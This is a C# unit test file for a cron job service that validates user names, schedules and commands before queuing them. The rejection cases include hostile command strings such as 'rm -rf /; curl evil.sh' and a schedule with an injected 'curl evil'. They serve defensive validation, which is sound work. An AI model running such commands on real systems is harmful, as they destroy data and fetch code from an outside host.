// SPDX-License-Identifier: EUPL-1.2
using System.Text.Json;
using Aetheus.Back.Components.Audit;
using Aetheus.Back.Components.Cron;
using Aetheus.Back.Data.Entities;
using Aetheus.Back.Exceptions;
using Aetheus.Shared.DTOs;
using Aetheus.Shared.Enums;
using NSubstitute;

namespace Aetheus.Back.Tests.Cron;

public class CronServiceTests
{
    private readonly ICronRepository _repo = Substitute.For<ICronRepository>();
    private readonly IAuditService _audit = Substitute.For<IAuditService>();
    private readonly Aetheus.Back.Components.Tasks.ITaskService _taskService = Substitute.For<Aetheus.Back.Components.Tasks.ITaskService>();
    private readonly CronService _sut;

    public CronServiceTests()
    {
        _sut = new CronService(_repo, _audit, _taskService);
    }

    [Fact]
    public async Task SaveJobAsync_ValidRequest_QueuesTask()
    {
        var request = new CronJobSaveRequest
        {
            Id = "job-7",
            User = "deploy",
            Schedule = "*/5 * * * *",
            Command = "/usr/bin/backup.sh"
        };

        ServerTask? captured = null;
        await _repo.AddTaskAsync(Arg.Do<ServerTask>(t => captured = t), Arg.Any<CancellationToken>());

        await _sut.SaveJobAsync(1, request, ct: TestContext.Current.CancellationToken);

        await _repo.Received(1).AddTaskAsync(Arg.Any<ServerTask>(), Arg.Any<CancellationToken>());
        await _audit.Received(1).LogAsync("CronSave", "Cron", 1, "deploy", Arg.Any<CancellationToken>());

        // Phase 3: queues a typed CronSave operation (not a free-form shell task). The job id is the
        // operation target; user/schedule/command travel in env vars for the agent-side helper.
        Assert.NotNull(captured);
        Assert.Equal(ExecutorType.Operation, captured!.Executor);
        Assert.Equal(OperationKind.CronSave, captured.Operation);
        Assert.Equal("job-7", captured.Command);
        Assert.DoesNotContain("crontab", captured.Command);
        var env = JsonSerializer.Deserialize<Dictionary<string, string>>(captured.EnvironmentVariables);
        Assert.NotNull(env);
        Assert.Equal("deploy", env!["AETHEUS_CRON_USER"]);
        Assert.Equal("*/5 * * * *", env["AETHEUS_CRON_SCHEDULE"]);
        Assert.Equal("/usr/bin/backup.sh", env["AETHEUS_CRON_COMMAND"]);

        await _taskService.Received(1).NotifyTaskQueuedAsync(Arg.Any<ServerTask>(), ct: Arg.Any<CancellationToken>());
    }

    [Theory]
    [InlineData("ROOT-USER!")]
    [InlineData("1invalid")]
    [InlineData("user with space")]
    public async Task SaveJobAsync_InvalidUser_Throws(string user)
    {
        var request = new CronJobSaveRequest { User = user, Schedule = "* * * * *", Command = "echo hi" };
        await Assert.ThrowsAsync<BadRequestException>(() => _sut.SaveJobAsync(1, request, ct: TestContext.Current.CancellationToken));
    }

    [Theory]
    [InlineData("")]
    [InlineData("not-a-cron")]
    [InlineData("99 99 * * *")]
    [InlineData("*/30 * * * * *")] // 6-field (seconds): rejected - /etc/cron.d is strictly 5-field
    public async Task SaveJobAsync_InvalidSchedule_Throws(string schedule)
    {
        var request = new CronJobSaveRequest { User = "deploy", Schedule = schedule, Command = "echo hi" };
        await Assert.ThrowsAsync<BadRequestException>(() => _sut.SaveJobAsync(1, request, ct: TestContext.Current.CancellationToken));
    }

    [Fact]
    public async Task SaveJobAsync_RootUser_Throws()
    {
        // #10: a root cron job is the agent-compromise→root escalation path - rejected at save.
        var request = new CronJobSaveRequest { Id = "job-1", User = "root", Schedule = "* * * * *", Command = "echo hi" };
        await Assert.ThrowsAsync<BadRequestException>(() => _sut.SaveJobAsync(1, request, ct: TestContext.Current.CancellationToken));
    }

    [Theory]
    [InlineData("echo $(whoami)")]
    [InlineData("rm -rf /; curl evil.sh")]
    [InlineData("ls | grep foo")]
    [InlineData("echo `whoami`")]
    [InlineData("echo \"hello\"")]
    [InlineData("cmd && other")]
    [InlineData("cmd\nother")]
    public async Task SaveJobAsync_DangerousCommand_Throws(string command)
    {
        var request = new CronJobSaveRequest { User = "deploy", Schedule = "* * * * *", Command = command };
        await Assert.ThrowsAsync<BadRequestException>(() => _sut.SaveJobAsync(1, request, ct: TestContext.Current.CancellationToken));
    }

    [Fact]
    public async Task DeleteJobAsync_ValidRequest_QueuesTask()
    {
        var request = new CronJobDeleteRequest { Id = "job-123", User = "root" };

        ServerTask? captured = null;
        await _repo.AddTaskAsync(Arg.Do<ServerTask>(t => captured = t), Arg.Any<CancellationToken>());

        await _sut.DeleteJobAsync(1, request, ct: TestContext.Current.CancellationToken);

        await _repo.Received(1).AddTaskAsync(Arg.Any<ServerTask>(), Arg.Any<CancellationToken>());
        await _audit.Received(1).LogAsync("CronDelete", "Cron", 1, "job-123", Arg.Any<CancellationToken>());

        // Phase 3: queues a typed CronDelete operation carrying the job id as target.
        Assert.NotNull(captured);
        Assert.Equal(ExecutorType.Operation, captured!.Executor);
        Assert.Equal(OperationKind.CronDelete, captured.Operation);
        Assert.Equal("job-123", captured.Command);
    }

    [Theory]
    [InlineData("bad id!", "root")]
    [InlineData("id with space", "root")]
    [InlineData("", "root")]
    [InlineData("job-1", "bad user")]
    [InlineData("job-1", "1invalid")]
    public async Task DeleteJobAsync_InvalidInput_Throws(string id, string user)
    {
        var request = new CronJobDeleteRequest { Id = id, User = user };
        await Assert.ThrowsAsync<BadRequestException>(() => _sut.DeleteJobAsync(1, request, ct: TestContext.Current.CancellationToken));
    }

    [Theory]
    [InlineData("root", true)]
    [InlineData("user_1", true)]
    [InlineData("_root", true)]
    [InlineData("1bad", false)]
    [InlineData("bad user", false)]
    [InlineData("", false)]
    public void IsValidUser_ReturnsExpected(string user, bool expected)
    {
        Assert.Equal(expected, CronService.IsValidUser(user));
    }

    [Theory]
    [InlineData("root", false)]   // #10: root is the escalation vector - rejected on the save path
    [InlineData("ROOT", false)]   // case-insensitive
    [InlineData("deploy", true)]
    [InlineData("_svc", true)]
    [InlineData("1bad", false)]
    [InlineData("", false)]
    public void IsValidNonRootUser_ReturnsExpected(string user, bool expected)
    {
        Assert.Equal(expected, CronService.IsValidNonRootUser(user));
    }

    [Theory]
    [InlineData("abc-123", true)]
    [InlineData("abc_xyz", true)]
    [InlineData("a", true)]
    [InlineData("bad!id", false)]
    [InlineData("", false)]
    public void IsValidIdentifier_ReturnsExpected(string id, bool expected)
    {
        Assert.Equal(expected, CronService.IsValidIdentifier(id));
    }

    [Theory]
    [InlineData("* * * * *", true)]
    [InlineData("*/5 * * * *", true)]
    [InlineData("0 0 1 1 *", true)]
    [InlineData("*/30 * * * * *", false)] // 6-field (seconds) → rejected: /etc/cron.d is strictly 5-field
    [InlineData("* * * *", false)]        // 4-field → rejected
    [InlineData("", false)]
    [InlineData("not-cron", false)]
    [InlineData("99 99 * * *", false)]
    [InlineData("* * * * *; curl evil", false)]
    public void IsValidSchedule_ReturnsExpected(string schedule, bool expected)
    {
        Assert.Equal(expected, CronService.IsValidSchedule(schedule));
    }

    [Theory]
    [InlineData("/usr/bin/backup.sh", true)]
    [InlineData("echo hello", true)]
    [InlineData("/path/to/cmd -a -b --flag=1", true)]
    [InlineData("echo $(whoami)", false)]
    [InlineData("echo `whoami`", false)]
    [InlineData("cmd | other", false)]
    [InlineData("cmd; other", false)]
    [InlineData("cmd && other", false)]
    [InlineData("cmd > /tmp/out", false)]
    [InlineData("", false)]
    public void IsValidCommand_ReturnsExpected(string command, bool expected)
    {
        Assert.Equal(expected, CronService.IsValidCommand(command));
    }
}
